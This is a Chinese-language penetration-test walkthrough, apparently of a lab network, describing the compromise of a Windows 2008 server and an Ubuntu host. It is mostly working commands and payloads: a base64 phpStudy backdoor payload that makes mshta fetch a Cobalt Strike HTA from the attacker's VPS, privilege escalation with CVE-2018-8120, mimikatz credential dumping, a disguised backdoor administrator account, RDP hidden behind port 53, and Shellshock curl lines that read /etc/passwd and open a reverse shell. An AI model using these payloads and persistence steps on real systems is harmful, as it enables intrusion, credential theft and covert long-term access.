windows-linux

一、环境

攻击环境：

vps：106.xx.xx.170

本地ip：10.xx.xx.166

目标环境：

网段：10.xx.xx.0/24

windows 2008 server：10.xx.xx.124

ubuntu16.04：10.xx.xx.122

二、攻击windows

nmap扫描网段发现存活的ip，10.xx.xx.124和122存活

nmap -A -T 4 -v 10.xx.xx.0/24


nmap -A -T 4 -v 10.xx.xx.124


发现80，8080，3306等一下端口

对web服务进行目录扫描

python3 dirsearch.py -u http://10.xx.xx.124:80 -e *python3 dirsearch.py -u http://10.xx.xx.124:8080 -e *


发现phpinfo，访问http://10.xx.xx.124/phpinfo.php


发现phpstudy和PHP版本

PHP版本5.2.17

E:\phpStudy\PHPTutorial\php\php-5.2.17\php.ini

E:/phpStudy/PHPTutorial/WWW

然后考虑使用phpstudy后门漏洞尝试

直接抓包phpinfo的页面数据包，添加检测命令，发现存在后门漏洞

Accept-charset: c3lzdGVtKCJ3aG9hbWkiKTs=accept-Encoding: gzip,deflate其中“c3lzdGVtKCJ3aG9hbWkiKTs=”为“system('whoami');”的base64编码



制作hta木马执行cs上线操作

cs上设置好监听，选择Attack--Package--HTML application制作对应的hta木马文件


【监听方式选择bindto，不然反复几次不成功】


制作hta木马，选择文件生成位置，我放到了桌面，木马文件上传到自己的vps上



vps上在同目录的文件夹下使用python起一个http服务，这样让受害主机从自己的vps上读取hta木马文件到内存中执行，达到无文件落地上线cs目的



修改burp数据包中的命令替换


Accept-charset:c3lzdGVtKCYjMzk7bXNodGEgaHR0cDovLzEwNi4xMi4xODcuMTcwOjg4OC9ldmlsJiMzOTspOw==



我这里直接用脚本上传



然后cs接收到反弹的shell



同时看到目标主机访问我的vps记录



此时已经可以操控目标机器124，但是为了稳定还是决定留个后门



上传wehshell大马【此处省略】

cs上执行whoami，发现是administrator权限买单时这里并不是最高权限，提权到系统权限



上传cve-2018-8120工具用于提权，提权成功



【这里为了隐蔽可以考虑上线进程迁移，参考链接https://blog.csdn.net/qq_44874645/article/details/120956977】

run minikatz进行密码和哈希抓取



添加后门账号DefaultAccunt，将账号添加到管理员组中


net user "DefaultAccunt" "fl***" /addnet localgroup administrators "DefaultAccunt" /add



开远程3389端口


reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f# 开完之后确定一下是否开启成功reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections# 显示0x0即成功



转发端口3389到53端口，然后使用后门账号远程桌面连接【dns端口53，装成dns服务】


netsh interface portproxy add v4tov4 listenport=53listenaddress=10.xx.xx.124 connectport=3389 connectaddress=10.xx.xx.124


windows 的攻击结束，开始同网段向别的机器横向移动

三、攻击linux

cs上传内网扫描工具扫描内网，可发现主机10.xx.xx.122


arp -a # 扫描# 或者下载namp，TxPortMap扫描工具


发现主机122开了80，8080等端口

进行目录扫描，发现shellshock的特征



访问一下页面



尝试利用


curl -A "() { :; }; echo; /bin/cat /etc/passwd" http://10.xx.xx.122:8080/cgi-bin/status# 可以执行命令



直接上反弹shell，vps监听


curl -A "() { :; }; echo; /bin/bash -i >& /dev/tcp/[ip]/1234 0>&1" http://10.xx.xx.122:8080/cgi-bin/status# 反弹
